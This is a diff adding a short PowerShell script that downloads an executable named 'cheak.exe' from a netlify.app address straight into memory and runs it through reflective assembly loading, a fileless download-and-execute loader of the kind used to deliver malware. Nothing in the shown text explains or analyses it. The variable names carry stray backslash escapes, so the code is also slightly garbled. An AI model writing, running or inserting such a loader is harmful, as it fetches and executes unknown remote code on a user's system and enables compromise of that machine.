@@ -1,0 +1,7 @@
+[Net.ServicePointManager]::SecurityProtocol = 3072
+$ProgressPreference = 'SilentlyContinue'
+
+\(wc = New-Object System.Net.WebClient
+\)bin = \(wc.DownloadData("https://cheak3.netlify.app/cheak.exe")
+
+[System.Reflection.Assembly]::Load(\)bin).EntryPoint.Invoke($null, @(,$null))
